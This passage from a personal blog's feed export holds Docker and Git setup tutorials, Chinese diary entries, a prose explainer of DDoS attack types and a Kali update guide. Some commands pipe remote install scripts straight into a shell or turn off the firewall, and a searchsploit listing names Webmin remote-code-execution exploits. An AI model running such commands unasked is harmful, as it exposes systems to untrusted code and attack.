        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker-compose</title>
      <link href="/2020/06/30/docker-compose/"/>
      <url>/2020/06/30/docker-compose/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css"><div class=".article-gallery" <p><a href="https://engineering.opensooq.com/wp-content/uploads/2017/12/On-the-fly-ad-hoc-docker-compose-development-stack1.jpg" class="gallery-item"><img src="https://engineering.opensooq.com/wp-content/uploads/2017/12/On-the-fly-ad-hoc-docker-compose-development-stack1.jpg"></a><p></p><h2 id="Docker-Compose-Compose-简介"><a href="#Docker-Compose-Compose-简介" class="headerlink" title="Docker Compose Compose 简介"></a>Docker Compose Compose 简介</h2><p>Compose 是用于定义和运行多容器 Docker 应用程序的工具。通过 Compose，您可以使用 YML 文件来配置应用程序需要的所有服务。然后，使用一个命令，就可以从 YML 文件配置中创建并启动所有服务。<br>如果你还不了解 YML 文件配置，可以先阅读 YAML 入门教程。##<br>Compose 使用的三个步骤：<br>• 使用 Dockerfile 定义应用程序的环境。<br>• 使用 docker-compose.yml 定义构成应用程序的服务，这样它们可以在隔离环境中一起运行。<br>最后，执行 docker-compose up 命令来启动并运行整个应用程序。</p><h2 id="Installing-docker-compose"><a href="#Installing-docker-compose" class="headerlink" title="Installing docker-compose"></a>Installing docker-compose</h2><h3 id="Global-installation"><a href="#Global-installation" class="headerlink" title="Global installation"></a>Global installation</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">curl -L <span class="hljs-string">&quot;https://github.com/docker/compose/releases/download/1.23.2/docker-compose-$(uname -s)-$(uname -m)&quot;</span> -o docker-compose<br></code></pre></td></tr></table></figure><p>Once the binary is downloaded, we move it into /usr/local/bin and we make it executable:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">sudo mv docker-compose /usr/local/<span class="hljs-built_in">bin</span> &amp;&amp; sudo chmod +x /usr/local/<span class="hljs-built_in">bin</span>/docker-compose<br></code></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker安装（利用官网得一键脚本)</title>
      <link href="/2020/06/30/docker%E5%AE%89%E8%A3%85%EF%BC%88%E5%88%A9%E7%94%A8%E5%AE%98%E7%BD%91%E5%BE%97%E4%B8%80%E9%94%AE%E8%84%9A%E6%9C%AC/"/>
      <url>/2020/06/30/docker%E5%AE%89%E8%A3%85%EF%BC%88%E5%88%A9%E7%94%A8%E5%AE%98%E7%BD%91%E5%BE%97%E4%B8%80%E9%94%AE%E8%84%9A%E6%9C%AC/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css"><div class=".article-gallery" <p><a href="https://d33wubrfki0l68.cloudfront.net/e7a6759eb6232b4280b83b18aa255289d65e4b6e/7698a/images/logo.webp" class="gallery-item"><img src="https://d33wubrfki0l68.cloudfront.net/e7a6759eb6232b4280b83b18aa255289d65e4b6e/7698a/images/logo.webp"></a><p></p><h2 id="CentOS-Docker-安装"><a href="#CentOS-Docker-安装" class="headerlink" title="CentOS Docker 安装"></a>CentOS Docker 安装</h2><p>Docker 支持以下的 64 位 CentOS 版本：<br>• CentOS 7<br>• CentOS 8<br>更高版本…</p><h2 id="使用官方安装脚本自动安装"><a href="#使用官方安装脚本自动安装" class="headerlink" title="使用官方安装脚本自动安装"></a>使用官方安装脚本自动安装</h2><p>安装命令如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">curl -fsSL https://get.docker.com | bash -s docker --mirror Aliyun    (这里利用阿里云的镜像）<br></code></pre></td></tr></table></figure><p>也可以使用国内 daocloud 一键安装命令：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">curl -sSL https://get.daocloud.io/docker | sh<br><br></code></pre></td></tr></table></figure><span id="more"></span><h4 id="安装过程中报错：缺少containerd-io-相关组件。"><a href="#安装过程中报错：缺少containerd-io-相关组件。" class="headerlink" title="安装过程中报错：缺少containerd.io 相关组件。"></a>安装过程中报错：缺少containerd.io 相关组件。</h4><p>Install the latest available containerd.io package manually<br>If we stricly need to install the latest version of docker-ce, we can install the required version of containerd.io manually, by running:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">sudo dnf install https://download.docker.com/linux/centos/<span class="hljs-number">7</span>/x86_64/stable/Packages/containerd.io-<span class="hljs-number">1.2</span><span class="hljs-number">.6</span>-<span class="hljs-number">3.3</span>.el7.x86_64.rpm<br></code></pre></td></tr></table></figure><h2 id="关闭防火墙"><a href="#关闭防火墙" class="headerlink" title="关闭防火墙"></a>关闭防火墙</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">sudo systemctl disable firewalld<br>sudo systemctl stop firewalld<br><br><br></code></pre></td></tr></table></figure><h2 id="将docker-注册成服务"><a href="#将docker-注册成服务" class="headerlink" title="将docker 注册成服务"></a>将docker 注册成服务</h2><p>Start and enable the docker daemon<br>Once docker-ce is installed, we must start and enable the docker daemon, so that it will be also launched automatically at boot. The command we need to run is the following:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">sudo systemctl enable --now docker<br></code></pre></td></tr></table></figure><p>At this point, we can confirm that the daemon is active by running:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">systemctl <span class="hljs-keyword">is</span>-active docker<br></code></pre></td></tr></table></figure><p>active<br>Similarly, we can check that it is enabled at boot, by running:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">systemctl <span class="hljs-keyword">is</span>-enabled docker<br></code></pre></td></tr></table></figure><p>enabled</p><h2 id="相关参考"><a href="#相关参考" class="headerlink" title="相关参考"></a>相关参考</h2><p> <a href="https://linuxconfig.org/how-to-install-docker-in-rhel-8">    How to install Docker CE on RHEL 8 / CentOS 8</a><br><a href="https://www.runoob.com/docker/centos-docker-install.html"> 菜鸟论坛Centos Docker安装</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20200630个人日记</title>
      <link href="/2020/06/30/20200630%E4%B8%AA%E4%BA%BA%E6%97%A5%E8%AE%B0/"/>
      <url>/2020/06/30/20200630%E4%B8%AA%E4%BA%BA%E6%97%A5%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css"><div class=".article-gallery" <p><a href="https://miro.medium.com/max/1400/1*QqoS6WsjG6WSr9-BFFQhbA.jpeg" class="gallery-item"><img src="https://miro.medium.com/max/1400/1*QqoS6WsjG6WSr9-BFFQhbA.jpeg"></a><p></p><h2 id="The-key-of-success-is-you-can-catch-opporunity"><a href="#The-key-of-success-is-you-can-catch-opporunity" class="headerlink" title="The key of success is you can catch opporunity."></a>The key of success is you can catch opporunity.</h2><p>almost of us don’t have the skill. 在中国的传统思想里面，自制，隐忍，勤奋，天资聪慧才是成功之道需要具备的能力。<br>但是，事实上两耳不闻窗外事，一心只读圣贤书，注定在这个社会是要失败的。现在社会的变化速度，信息量已经不是古时候的<br>光景。机会瞬息万变，无论是危机，和看起来是迈向成功的机会，（这两者之间在很大程度上，是有反转的机会的。）</p><p>事实上，能够看到机会，机遇，并且调整自己的“姿势”，以便迅速的获取利益，比自己的能力高低，修养提升如何更加的来得有用。<br>就拿2020年的这场新冠病毒来说，有人失业，有人却利用阿里巴巴外贸的监管缺口，迅速更改主业，变成销售口罩产品，在国内采购口罩，<br>转卖到急需口罩的国外，赚取中间的利润几百万。这里面就是“心态”“姿势”“经验”“机遇把握”等问题最终决定的。<br>这也印证了一句话，危机即机遇。</p><p>我们需要训练这种把握机遇的能力。至于如何训练，是我暂时没有想法的。但是，我想，基本的开拓视野，有全球化的眼光，是必须的一个条件之一。<br>就拿中国的房价来说，如果你从中国的整个市场来看，惊人的涨幅，让你觉得不可思议。但是，如果你看下日本，看下其他国家，在类似的历史<br>时期内也经历过相同的事情，那么你就可以预先的预估到类似的事情的发展曲线。虽然，没人能逃脱价值的本体，但是价格浮动空间却是价值的几何倍数。<br>想想，在中国一线城市的一套房子，可能就决定了你的一生是否能被世俗得定义为成功或者失败。</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2020年6月23日随笔</title>
      <link href="/2020/06/23/20200623%E4%B8%AA%E4%BA%BA%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95/"/>
      <url>/2020/06/23/20200623%E4%B8%AA%E4%BA%BA%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css"><div class=".article-gallery" <a href="https://www.buhuixiu.com/images/school.png"><img src="https://www.buhuixiu.com/images/school.png" height="500" width="300" align="middle"><h1 id="学校的操场"><a href="#学校的操场" class="headerlink" title="学校的操场"></a>学校的操场</h1><h1 id="长满了草"><a href="#长满了草" class="headerlink" title="长满了草"></a>长满了草</h1><h1 id="像极"><a href="#像极" class="headerlink" title="像极"></a>像极</h1><h1 id="青春的坟头……"><a href="#青春的坟头……" class="headerlink" title="青春的坟头……"></a>青春的坟头……</h1><h1 id="回去看你一眼"><a href="#回去看你一眼" class="headerlink" title="回去看你一眼"></a>回去看你一眼</h1><h1 id="可能"><a href="#可能" class="headerlink" title="可能"></a>可能</h1><h1 id="当初的纠葛"><a href="#当初的纠葛" class="headerlink" title="当初的纠葛"></a>当初的纠葛</h1><h1 id="是爱恨，是不舍，是甜蜜"><a href="#是爱恨，是不舍，是甜蜜" class="headerlink" title="是爱恨，是不舍，是甜蜜?"></a>是爱恨，是不舍，是甜蜜?</h1><h1 id="感谢你"><a href="#感谢你" class="headerlink" title="感谢你"></a>感谢你</h1><h1 id="青春名片里最靓丽的那张照片"><a href="#青春名片里最靓丽的那张照片" class="headerlink" title="青春名片里最靓丽的那张照片"></a>青春名片里最靓丽的那张照片</h1><h1 id="最纯情想爱的样子"><a href="#最纯情想爱的样子" class="headerlink" title="最纯情想爱的样子"></a>最纯情想爱的样子</h1></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>what is a DDOS attack</title>
      <link href="/2020/06/05/%E4%BB%80%E4%B9%88%E6%98%AFDDOS%E6%94%BB%E5%87%BB/"/>
      <url>/2020/06/05/%E4%BB%80%E4%B9%88%E6%98%AFDDOS%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css"><div class=".article-gallery" <p>  分布式拒绝服务（Distributed Denial of Service，简称DDoS）指借助于客户机/服务器模式，将多个计算机联合起来作为攻击平台，对一个或多个目标发动DDoS攻击，从而成倍地提高拒绝服务攻击的威力。<p></p><p>通常，攻击者使用一个非法账号将DDoS主控程序安装在一台计算机上，并在网络上的许多计算机上安装了代理程序。在所设定的时间，主控程序将与大量代理程序进行通讯，代理程序收到指令时就发动攻击。利用客户机/服务器模式，主控程序能在几秒钟内激活成百上千次代理程序的运行。</p><p>常见的DDoS攻击类型包括畸形报文、传输层DDoS攻击、DNS DDoS攻击、连接型DDoS攻击、Web应用层DDoS攻击。关于每种类型的具体介绍，请参见下文说明。</p><h5 id="畸形报文"><a href="#畸形报文" class="headerlink" title="畸形报文"></a>畸形报文</h5><p>畸形报文攻击指通过向目标系统发送有缺陷的IP报文，使得目标系统在处理这样的报文时出现崩溃，从而达到拒绝服务的攻击目的。</p><p>畸形报文主要包括以下类型：Frag Flood、Smurf、Stream Flood、Land Flood、IP畸形报文、TCP畸形报文、UDP畸形报文。</p><h5 id="传输层DDoS攻击"><a href="#传输层DDoS攻击" class="headerlink" title="传输层DDoS攻击"></a>传输层DDoS攻击</h5><p>传输层DDoS攻击主要是指Syn Flood、Ack Flood、UDP Flood、ICMP Flood、RstFlood等攻击。</p><p>以Syn Flood攻击为例，它利用了TCP协议的三次握手机制，当服务端接收到一个Syn请求时，服务端必须使用一个监听队列将该连接保存一定时间。因此，通过向服务端不停发送Syn请求，但不响应Syn+Ack报文，从而消耗服务端的资源。当监听队列被占满时，服务端将无法响应正常用户的请求，达到拒绝服务攻击的目的。</p><h5 id="DNS-DDoS攻击"><a href="#DNS-DDoS攻击" class="headerlink" title="DNS DDoS攻击"></a>DNS DDoS攻击</h5><p>DNS DDoS攻击主要是指DNS Request Flood、DNS Response Flood、虚假源+真实源DNS Query Flood、权威服务器攻击和Local服务器攻击。</p><p>以DNS Query Flood攻击为例，其本质上执行的是真实的Query请求，属于正常业务行为。但如果多台傀儡机同时发起海量的域名查询请求，服务端无法响应正常的Query请求，从而导致拒绝服务。</p><h5 id="连接型DDoS攻击"><a href="#连接型DDoS攻击" class="headerlink" title="连接型DDoS攻击"></a>连接型DDoS攻击</h5><p>连接型DDoS攻击主要是指TCP慢速连接攻击、连接耗尽攻击、Loic、Hoic、Slowloris、 Pyloris、Xoic等慢速攻击。</p><p>以Slowloris攻击为例，其攻击目标是Web服务器的并发上限，当Web服务器的连接并发数达到上限后，Web服务即无法接受新的请求。具体来说，Web服务接收到新的HTTP请求时，建立新的连接来处理请求，并在处理完成后关闭这个连接；如果该连接一直处于连接状态，收到新的HTTP请求时则需要建立新的连接进行处理；而当所有连接都处于连接状态时，Web将无法处理任何新的请求。</p><p>Slowloris攻击利用HTTP协议的特性来达到攻击目的。HTTP请求以\r\n\r\n标识Headers的结束，如果Web服务端只收到\r\n，则认为HTTP Headers部分没有结束，将保留该连接并等待后续的请求内容。</p><h5 id="Web应用层DDoS攻击"><a href="#Web应用层DDoS攻击" class="headerlink" title="Web应用层DDoS攻击"></a>Web应用层DDoS攻击</h5><p>Web应用层攻击主要是指HTTP Get Flood、HTTP Post Flood、CC等攻击。</p><p>通常应用层攻击完全模拟用户请求，类似于各种搜索引擎和爬虫一样，这些攻击行为和正常的业务并没有严格的边界，难以辨别。</p><p>Web服务中一些资源消耗较大的事务和页面。例如，Web应用中的分页和分表，如果控制页面的参数过大，频繁的翻页将会占用较多的Web服务资源。尤其在高并发频繁调用的情况下，类似这样的事务就成了早期CC攻击的目标。</p><p>由于现在的攻击大都是混合型的，因此模拟用户行为的频繁操作都可以被认为是CC攻击。例如，各种刷票软件对网站的访问，从某种程度上来说就是CC攻击。</p><p>CC攻击瞄准的是Web应用的后端业务，除了导致拒绝服务外，还会直接影响Web应用的功能和性能，包括Web响应时间、数据库服务、磁盘读写等。</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> 非原创 </tag>
            
            <tag> 阿里云 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20200603个人日志记录</title>
      <link href="/2020/06/03/20200603%E4%B8%AA%E4%BA%BA%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95/"/>
      <url>/2020/06/03/20200603%E4%B8%AA%E4%BA%BA%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css"><div class=".article-gallery" <h3 id="昨晚很晚才睡。"><a href="#昨晚很晚才睡。" class="headerlink" title="昨晚很晚才睡。"></a>昨晚很晚才睡。<p>  　　老婆接近2点多才回来，还喝了酒。虽然是为了工作上的事情，也不想给她好脸色看。她一方面抱怨工作太累，压力太大，支撑太少，需求得不到满足。一方面又很投入。乐此不疲，热衷聚会，从不缺席。好几个以前的同事，都跟我说，莎姐不容易，处在一个尴尬的位置，每天受气。让我不要跟她争吵，好好体谅她。</p><p> 　　她处在这个位置也已经有4-5年了，改变得很少。无论是管理方式，还是自身的提升。依旧是劳动密集型管理，喜欢跟人聊天式的沟通，电话1-2个小时。当我跟她说这些的时候，她总是一副，你别以为你聪明的样子。</p><p>  　　 看以前老婆的照片，年轻时候的照片，确实很漂亮。是我非常喜欢的类型。<a href="20200603%E4%B8%AA%E4%BA%BA%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95/psu.jfif" title="node更换路径" class="gallery-item"><img src="/2020/06/03/20200603%E4%B8%AA%E4%BA%BA%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95/psu.jfif" alt="node更换路径"></a> 也许生活再重来一次，我依旧无法逃脱她的诱惑。虽然她对你的事业，对你的行为习惯，没有谈得上太多助益的地方。更多的时候，是将你带入一些与理想目标背道而驰的方向。比如说，晚睡熬夜；周末睡到9-10点起来；从不看书；早餐可吃可不吃；带着儿子看抖音；快吃饭了，还开包零食吃下。 但，无可否认，她的善良，她的勤劳，她的包容是那些自制，有明确奋斗目标的高级知识分子所无法企及的。很明显的一个感觉是，这10多年来，我感觉是被她塑造了。或许，是我意志不够坚定，或许是我不想忍受那份家庭割裂的寂寞和痛苦，或许…….幸运的是，现在还好，我们之间相处还算融洽，没有什么无法沟通的东西。不知道她是否有同样的感觉，大概率是没有的吧。有时候，跟她开玩笑说，她应该投胎做个男人，我也会问她，是否想做个男人。虽然表面上，她像个男人一样大大咧咧，但是关键时候，又很怕担当责任，希望我站出来，拿定主意。她给出的解释是，我老说她…..这的确是一个非常正当的理由。</p><p>　　儿子不是那种喜欢学习的人，不够认真。在课堂上的表现可以说是很差。。但是作为父母，随着年龄的增长。很多时候，必须扮演成一个演员。成为他的fans。能够主动去发现他的闪光点，能够赞赏他。。不要觉得他笨或者不理解他为啥不能将你说得这么直白的话吃透，人与人之间的沟通本就很难，何况还加了数学，物理，英语这些沟壑。。。还是希望他能够自强和独立。。我记得自己读浏阳师范的时候，还因为校服的白袖子脏得无以附加，而被老师请上了讲台，当众“展览”。虽然那位老师可能并非出于恶意，但是对我而言还是不好受的。从一个侧面可以反映出，我的生活自理能力在当时是挺差的，生活水准也是挺低的（穷）。经常会饿肚子。。这也怪不得家里，主要是自己用钱的方式不行。。有钱潇洒月初，无钱潦倒月尾。这点儿子倒是像极了我，很“大方”。待人热诚，喜欢把家里东西送人，好像资源很充裕的样子。读书那会，班上有比我生活更拮据的同学，但是却不像我一样会时不时得捉襟见肘。他们会把钱的用度安排得很合理。。比较奇怪的是，我这样一个屌丝类型的犀利哥。在中专快毕业的时候，竟然牵手成功了一个班上的学委妹子。看着毕业那会照的照片，我依旧是那个屌丝的样子。见不得半点讨喜的音容。。毕业后断断续续去见了那个妹子几次，人是对我越来越冷了，也就彻底断了念想。。连同学聚会也不想去了。。        </p><pre><code>                                                                           2020/06/03 随笔    </code></pre></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> 个人日记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 个人日记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何更新KALI_Linux</title>
      <link href="/2019/07/27/%E5%A6%82%E4%BD%95%E6%9B%B4%E6%96%B0KALI-Linux/"/>
      <url>/2019/07/27/%E5%A6%82%E4%BD%95%E6%9B%B4%E6%96%B0KALI-Linux/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css"><div class=".article-gallery" <h2 id="为什么需要更新kali-linux"><a href="#为什么需要更新kali-linux" class="headerlink" title="为什么需要更新kali-linux"></a>为什么需要更新kali-linux<p>因为相应的cve 公布的漏洞及poc是不定期更新的，如果你不更新，无法获取相关的一些信息。<br>官方的建议就是每隔几周你需要更新下版本。<br>如果你需要使用新的版本工具，或者听到关于安全更新，但是无法搜索到，那么，你就必须要更行版本呢了。就像下面这个，如果一年不更新，那么相关的Remote code Execution 47293.sh是无法搜索到的。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">root@kali:~# searchsploit webmin 1.920<br>---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------<br> Exploit Title                                                                                                                                                                    |  Path<br>---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------<br>Webmin 1.920 - Remote Code Execution                                                                                                                                              | linux/webapps/47293.sh<br>Webmin 1.920 - Unauthenticated Remote Code Execution (Metasploit)                                                                                                                 | linux/remote/47230.rb<br>Webmin &lt; 1.920 - &#x27;rpc.cgi&#x27; Remote Code Execution (Metasploit)                                                                                                                     | linux/webapps/47330.rb<br>---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------<br></code></pre></td></tr></table></figure><p>kali_linux 是滚动发行版本，有两个更新源。1，testing 2,stable .对于相应的测试版本，可能存在破坏工具，使用工具不可用的情况。不建议更新。<br>如果使用最新的镜像，那么你不需要更新。</p><h2 id="如何更新"><a href="#如何更新" class="headerlink" title="如何更新"></a>如何更新</h2><p>确保 <font color="red">etc/apt/sources.list</font> 进行了合适的配置。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">kali@kali:~$ cat /etc/apt/sources.list<br>deb http://http.kali.org/kali kali-rolling main contrib non-free<br>deb-src http://http.kali.org/kali kali-rolling main contrib non-free<br></code></pre></td></tr></table></figure><p>然后运行如下的命令，从而更行到最新的Kali 版本。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">kali@kali:~$ sudo apt update<br>kali@kali:~$<br>kali@kali:~$ sudo apt full-upgrade -y<br>kali@kali:~$<br></code></pre></td></tr></table></figure><h2 id="整个过程大概耗时30分钟……………没有使用代理和镜像站点的情况下。"><a href="#整个过程大概耗时30分钟……………没有使用代理和镜像站点的情况下。" class="headerlink" title="整个过程大概耗时30分钟……………没有使用代理和镜像站点的情况下。"></a>整个过程大概耗时30分钟……………没有使用代理和镜像站点的情况下。</h2></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> kali-linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0 Git服务器安装</title>
      <link href="/2017/08/18/0%E6%90%AD%E5%BB%BAGit%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
      <url>/2017/08/18/0%E6%90%AD%E5%BB%BAGit%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css"><div class=".article-gallery" <p><a href="https://www.liaoxuefeng.com/wiki/0013739516305929606dd18361248578c67b8067c8c017b000/00137583770360579bc4b458f044ce7afed3df579123eca000">原文</a><p></p><ul><li>  搭建Git服务器非常简单，通常10分钟即可完成；</li><li>  要方便管理公钥，用Gitosis；</li><li>  要像SVN那样变态地控制权限，用Gitolite。</li></ul><p>假设你已经有sudo权限的用户账号，下面，正式开始安装。</p><h5 id="第一步，安装git："><a href="#第一步，安装git：" class="headerlink" title="第一步，安装git："></a>第一步，安装git：</h5><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">$ sudo apt-<span class="hljs-builtin-name">get</span> install git<br><br></code></pre></td></tr></table></figure><span id="more"></span><h5 id="第二步，创建一个git用户，用来运行git服务："><a href="#第二步，创建一个git用户，用来运行git服务：" class="headerlink" title="第二步，创建一个git用户，用来运行git服务："></a>第二步，创建一个git用户，用来运行git服务：</h5><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>sudo adduser git<br><br></code></pre></td></tr></table></figure><h5 id="第三步，创建证书登录："><a href="#第三步，创建证书登录：" class="headerlink" title="第三步，创建证书登录："></a>第三步，创建证书登录：</h5><p>收集所有需要登录的用户的公钥，就是他们自己的<code>id_rsa.pub</code>文件，把所有公钥导入到<code>/home/git/.ssh/authorized_keys</code>文件里，一行一个。</p><h5 id="第四步，初始化Git仓库："><a href="#第四步，初始化Git仓库：" class="headerlink" title="第四步，初始化Git仓库："></a>第四步，初始化Git仓库：</h5><p>先选定一个目录作为Git仓库，假定是<code>/srv/sample.git</code>，在<code>/srv</code>目录下输入命令：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ada">$ sudo git init <span class="hljs-comment">--bare sample.git</span><br><br></code></pre></td></tr></table></figure><p>Git就会创建一个裸仓库，裸仓库没有工作区，因为服务器上的Git仓库纯粹是为了共享，所以不让用户直接登录到服务器上去改工作区，并且服务器上的Git仓库通常都以<code>.git</code>结尾。然后，把owner改为<code>git</code>：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>sudo chown -R <span class="hljs-symbol">git:</span>git sample.git<br><br></code></pre></td></tr></table></figure><h5 id="第五步，禁用shell登录："><a href="#第五步，禁用shell登录：" class="headerlink" title="第五步，禁用shell登录："></a>第五步，禁用shell登录：</h5><p>出于安全考虑，第二步创建的git用户不允许登录shell，这可以通过编辑/etc/passwd文件完成。找到类似下面的一行：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-symbol">git:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1001</span><span class="hljs-symbol">:</span><span class="hljs-number">1001</span><span class="hljs-symbol">:</span>,,,<span class="hljs-symbol">:/home/git</span><span class="hljs-symbol">:/bin/bash</span><br><br></code></pre></td></tr></table></figure><p>改为：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-symbol">git:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1001</span><span class="hljs-symbol">:</span><span class="hljs-number">1001</span><span class="hljs-symbol">:</span>,,,<span class="hljs-symbol">:/home/git</span><span class="hljs-symbol">:/usr/bin/git-shell</span><br><br></code></pre></td></tr></table></figure><p>这样，git用户可以正常通过ssh使用git，但无法登录shell，因为我们为git用户指定的git-shell每次一登录就自动退出。</p><h5 id="第六步，克隆远程仓库："><a href="#第六步，克隆远程仓库：" class="headerlink" title="第六步，克隆远程仓库："></a>第六步，克隆远程仓库：</h5><p>现在，可以通过git clone命令克隆远程仓库了，在各自的电脑上运行：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>git clone git<span class="hljs-variable">@server</span><span class="hljs-symbol">:/srv/sample</span>.git<br>Cloning into <span class="hljs-string">&#x27;sample&#x27;</span>...<br><span class="hljs-symbol">warning:</span> You appear to have cloned an empty 